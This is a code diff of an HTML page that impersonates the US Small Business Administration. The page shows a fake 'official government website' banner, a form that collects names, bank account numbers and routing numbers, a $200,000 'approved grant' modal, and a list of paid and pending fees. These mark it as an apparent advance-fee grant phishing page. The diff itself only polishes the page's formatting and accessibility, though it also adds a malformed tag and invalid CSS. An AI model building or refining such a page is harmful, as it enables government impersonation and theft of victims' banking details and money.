@@ -3,11 +3,12 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <title>Grant Disbursement | SBA</title>
 
   <!-- Favicon -->
   <link rel="icon" type="image/png" href="images2.png">
-  <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
+  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
   <link rel="apple-touch-icon" href="images2.png">
 
   <!-- jsPDF for receipt download -->
@@ -23,8 +24,8 @@
       min-height: 100vh;
       color: #222;
       position: relative;
-      z-index: 1;
     }
+
     /* --- Watermark --- */
     body::before {
       content: "";
@@ -37,7 +38,9 @@
       pointer-events: none;
       transition: opacity 0.5s ease-in-out;
     }
+
     body.processing-active::before { opacity: 0.25; }
+
     .form-container, form, .modal-content {
       position: relative;
       background: rgba(255,255,255,0.95);
@@ -45,6 +48,7 @@
       overflow: hidden;
       z-index: 1;
     }
+
     .form-container::before,
     form::before,
     .modal-content::before {
@@ -60,8 +64,9 @@
     /* Header + gov bar */
     .gov-bar { background:#f5f5f5; font-size:13px; padding:6px 12px; border-bottom:1px solid #ddd;}
     .gov-bar a { color:#005ea2; text-decoration:none; margin-left:6px; }
+
     .header { display:flex; justify-content:space-between; align-items:center; padding:16px; border-bottom:1px solid #ddd; background:rgba(255,255,255,0.9);}
-    .header img { height:40px; }
+    .header img { height:40px; alt="SBA Logo" }
     .header h1 { font-size:20px; color:#005ea2; margin:0;}
 
     /* Form */
@@ -76,7 +81,7 @@
     /* Processing */
     .processing { display:none; flex:1; justify-content:center; align-items:center; flex-direction:column;}
     .spinner { border:6px solid #eee; border-top:6px solid #005ea2; border-radius:50%; width:60px; height:60px; animation:spin 1s linear infinite; margin-bottom:15px;}
-    @keyframes spin { 0%{transform:rotate(0deg);}100%{transform:rotate(360deg);} }
+    @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
 
     /* --- Modals --- */
     .modal { position:fixed; top:0; left:0; right:0; bottom:0; background:rgba(0,0,0,0.6); display:none; justify-content:center; align-items:center; z-index:999;}
@@ -84,21 +89,24 @@
     @keyframes fadeIn { from{opacity:0; transform:translateY(-20px);} to{opacity:1; transform:translateY(0);} }
     .modal-content h2 { color:#005ea2; margin-bottom:15px;}
     .modal-content p { font-size:15px; margin:8px 0;}
-    .modal-content strong { color:#111; }
+    .modal-content strong { color:#111;}
 
     .fees { text-align:left; margin:15px 0; font-size:15px;}
     .fees p { display:flex; justify-content:space-between; margin:8px 0;}
     .paid { color:green; font-weight:bold;}
     .pending { color:red; font-weight:bold;}
-    .action-btns { margin-top:20px; display:flex; flex-direction:column; gap:10px; }
+    .action-btns { margin-top:20px; display:flex; flex-direction:column; gap:10px;}
 
     footer { background:#f5f5f5; border-top:1px solid #ddd; text-align:center; font-size:14px; padding:15px; color:#444; margin-top:auto;}
   </style>
 </head>
+
 <body>
 
   <!-- Government bar -->
-  <div class="gov-bar">🇺🇸 An official website of the United States government <a href="#">Here’s how you know</a></div>
+  <div class="gov-bar">
+    🇺🇸 An official website of the United States government <a href="#">Here’s how you know</a>
+  </div>
 
   <!-- Header -->
   <div class="header">
@@ -108,16 +116,16 @@
 
   <!-- Form -->
   <div class="form-box" id="formBox">
-    <form id="bankForm">
-      <h2>Enter Bank Details</h2>
+    <form id="bankForm" aria-labelledby="bankFormLabel">
+      <h2 id="bankFormLabel">Enter Bank Details</h2>
       <label for="fullname">Full Name</label>
-      <input type="text" id="fullname" required>
+      <input type="text" id="fullname" required aria-required="true">
       <label for="bank">Bank Name</label>
-      <input type="text" id="bank" required>
+      <input type="text" id="bank" required aria-required="true">
       <label for="account">Account Number</label>
-      <input type="text" id="account" required>
+      <input type="text" id="account" required aria-required="true">
       <label for="routing">Routing Number</label>
-      <input type="text" id="routing" required>
+      <input type="text" id="routing" required aria-required="true">
       <button type="submit" class="btn">Submit for Disbursement</button>
     </form>
   </div>
@@ -140,7 +148,8 @@
       <p><strong>Approved Grant Amount:</strong> <span style="font-size:18px; font-weight:bold; color:#005ea2;">$200,000</span></p>
       <button class="btn" onclick="showProcessing2()">Proceed</button>
     </div>
-  </div>
+  </div
+
 
   <!-- Modal 2 -->
   <div class="modal" id="modal2">
@@ -263,4 +272,5 @@
   </script>
 </body>
 </html>
+
 
